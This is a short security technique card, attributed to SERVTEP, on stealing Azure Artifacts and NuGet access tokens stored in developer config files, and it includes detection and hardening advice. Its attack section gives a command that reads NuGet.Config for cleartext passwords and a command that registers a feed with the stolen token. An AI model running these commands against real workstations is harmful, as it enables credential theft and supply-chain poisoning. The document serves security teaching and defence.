# [CA-TOKEN-016]: Artifact Registry Token Theft

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-016 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure Artifacts / NuGet |
| **Severity** | **Medium** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Developers use PATs to authenticate to private Azure Artifact feeds (NuGet, npm). These are stored in `~/.nuget/NuGet/NuGet.Config` (Windows) or `~/.npmrc` (Linux/Mac). If these files are stolen, an attacker can push malicious packages to internal feeds or pull proprietary code.
- **Attack Surface:** Developer Workstation.
- **Business Impact:** **Intellectual Property Theft** & **Supply Chain Poisoning**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Read access to home directory.
- **Tools:** `cat`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Extraction**
```bash
cat ~/.nuget/NuGet/NuGet.Config
# Look for <packageSourceCredentials> with ClearTextPassword
```

**Step 2: Abuse**
Configure local NuGet to use the stolen PAT.
```bash
nuget sources add -Name "StolenFeed" -Source <URL> -Username <User> -Password <PAT>
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 ADO Auditing
| Source | Event | Filter Logic |
|---|---|---|
| **Artifacts** | `Feed Access` | Access from unknown IPs. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Credential Helper:** Use the Azure Artifacts Credential Provider which handles auth interactively/securely, rather than storing static PATs in config files.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-004]
> **Next Logical Step:** [LAT-SUPPLY-001]
